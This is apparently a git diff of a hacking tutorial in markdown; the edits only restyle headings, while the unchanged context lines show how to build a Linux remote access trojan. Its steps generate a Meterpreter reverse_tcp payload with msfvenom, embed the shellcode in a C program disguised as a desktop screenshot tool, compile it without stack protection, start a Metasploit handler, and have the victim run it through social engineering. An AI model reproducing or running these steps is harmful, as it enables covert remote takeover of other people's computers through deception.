@@ -1,17 +1,17 @@
-#### EXERCISE OBJECTIVES
+#### :: EXERCISE OBJECTIVES
 Use Metasploit to build shellcode in C format and Insert C shellcode into a C program (RAT)<br />
 To be abble to control of a linux system remotely using social engineering.
 
 <br />
 
-#### STEPS REQUIRED TO ACHIEVE THIS
+#### :: STEPS REQUIRED TO ACHIEVE THIS
 [1º - Use Metasploit to Build Shellcode in C Format](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#use-metasploit-to-build-shellcode-in-c-format)<br />
 [2º - Insert the C shellcode created into a C program](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#insert-the-c-shellcode-created-into-a-c-program)<br />
 [3º - Use GCC to compile the C program (make it executable)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#use-gcc-to-compile-the-c-program-make-it-executable)<br />
 
 <br />
 
-#### [SOCIAL ENGINEERING](https://en.wikipedia.org/wiki/Social_engineering_(security))
+#### :: [SOCIAL ENGINEERING](https://en.wikipedia.org/wiki/Social_engineering_(security))
 **'Take a desktop screenshot using a C program'**.<br />
 The C program not only runs the shellcode (RAM) that allows us to control the target PC remotely,<br />
 but also executes a system command (sh) that takes a screenshot of the target PC desktop using<br />
@@ -30,7 +30,7 @@ but also executes a system command (sh) that takes a screenshot of the target PC
 
 <br /><br />
 
-#### SHELLCODING DESCRIPTION
+#### :: SHELLCODING DESCRIPTION
 
 <br /><br />
 
@@ -38,11 +38,11 @@ but also executes a system command (sh) that takes a screenshot of the target PC
 
 ---
 
-### STEP-BY-STEP (HOW-TO)
+### :: STEP-BY-STEP (HOW-TO)
 
 <br /><br />
 
-#### Build shellcode folder
+#### :: Build shellcode folder
 
 ```
 sudo mkdir shellcode
@@ -51,7 +51,7 @@ cd shellcode
 
 <br />
 
-#### Start postgresql service
+#### :: Start postgresql service
 
 ```
 sudo service postgresql start
@@ -59,7 +59,7 @@ sudo service postgresql start
 
 <br />
 
-#### Use Metasploit to Build Shellcode in C Format
+#### :: Use Metasploit to Build Shellcode in C Format
 
 ```
 ## Build raw shellcode in C
@@ -78,7 +78,7 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 
 <br />
 
-#### See whats written inside chars.raw (optional)
+#### :: See whats written inside chars.raw (optional)
 
 ```
 cat chars.raw
@@ -94,7 +94,7 @@ pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
 
 <br />
 
-#### Insert the C shellcode created into a C program
+#### :: Insert the C shellcode created into a C program
 
 ```
 echo "#include<stdio.h>" > payload.c
@@ -116,7 +116,7 @@ echo "}" >> payload.c
 
 <br />
 
-#### See whats written inside payload.c (optional)
+#### :: See whats written inside payload.c (optional)
 
 ```
 cat payload.c
@@ -124,7 +124,7 @@ cat payload.c
 
 <br />
 
-#### Use GCC to compile the C program (make it executable)
+#### :: Use GCC to compile the C program (make it executable)
 
 ```
 sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
@@ -132,7 +132,7 @@ sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
 
 <br />
 
-#### Start metasploit multi handler
+#### :: Start metasploit multi handler
 
 ```
 # WARNING: Replace LHOST value by your local ip address
@@ -142,7 +142,7 @@ sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT
 
 <br />
 
-#### Execute the C Program (remote machine)
+#### :: Execute the C Program (remote machine)
 
 ```
 chmod +x desktop_screenshot
@@ -157,7 +157,7 @@ sudo ./desktop_screenshot
 
 <br />
 
-#### Video Tutorial
+#### :: Video Tutorial
 
 [C Shellcode Linux - Video Tutorial](https://blablabla.)
 
